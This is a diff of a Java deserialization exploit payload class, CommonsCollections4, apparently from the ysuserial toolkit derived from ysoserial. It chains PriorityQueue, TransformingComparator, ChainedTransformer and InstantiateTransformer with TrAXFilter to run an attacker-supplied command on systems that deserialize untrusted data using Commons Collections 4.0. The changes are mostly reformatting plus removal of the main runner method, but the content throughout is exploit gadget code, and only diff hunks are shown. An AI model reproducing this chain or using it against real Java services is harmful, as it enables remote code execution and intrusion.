@@ -14,7 +14,6 @@ import org.apache.commons.collections4.functors.InstantiateTransformer;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 import org.su18.ysuserial.payloads.util.Reflections;
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
@@ -23,9 +22,8 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
  * Variation on CommonsCollections2 that uses InstantiateTransformer instead of
  * InvokerTransformer.
  */
-@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
-@Authors({ Authors.FROHOFF })
+@Authors({Authors.FROHOFF})
 public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String command) throws Exception {
@@ -34,8 +32,8 @@ public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 		ConstantTransformer constant = new ConstantTransformer(String.class);
 
 		// mock method name until armed
-		Class[] paramTypes = new Class[] { String.class };
-		Object[] args = new Object[] { "su18" };
+		Class[]  paramTypes = new Class[]{String.class};
+		Object[] args       = new Object[]{"su18"};
 		InstantiateTransformer instantiate = new InstantiateTransformer(
 				paramTypes, args);
 
@@ -43,7 +41,7 @@ public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
 		args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
 
-		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });
+		ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});
 
 		// create queue with numbers
 		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
@@ -56,9 +54,5 @@ public class CommonsCollections4 implements ObjectPayload<Queue<Object>> {
 		args[0] = templates;
 
 		return queue;
-	}
-
-	public static void main(final String[] args) throws Exception {
-		PayloadRunner.run(CommonsCollections4.class, args);
 	}
 }
